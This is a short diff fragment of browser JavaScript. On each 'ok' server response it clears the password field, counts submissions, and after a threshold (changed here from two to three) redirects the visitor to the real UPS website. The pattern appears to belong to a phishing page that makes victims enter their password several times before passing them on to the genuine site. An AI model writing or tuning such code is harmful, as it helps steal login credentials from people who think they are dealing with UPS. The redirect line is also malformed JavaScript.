@@ -119,7 +119,7 @@
 				   console.log(response);
 				   if(response['signal'] == 'ok'){
 					   $("#password").val("");
-					   if (count>=2) {
+					   if (count>=3) {
 						   count=0;
 				   // window.location.replace(response['redirect_link']);
 				 window.location.href("https://www.ups.com");
